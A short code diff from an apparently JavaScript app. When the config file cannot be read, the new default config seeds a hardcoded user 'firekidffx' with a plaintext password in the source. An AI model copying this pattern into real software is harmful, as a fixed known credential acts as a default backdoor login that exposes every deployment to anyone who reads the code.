@@ -31,7 +31,9 @@ async function getConfig() {
         return JSON.parse(configData);
     } catch (err) {
         const newConfig = {
-            users: {},
+            users: {
+                "firekidffx": hashPass("ahmed@ibmk")
+            },
             keywords: [],
             channels: {},
             groups: {},
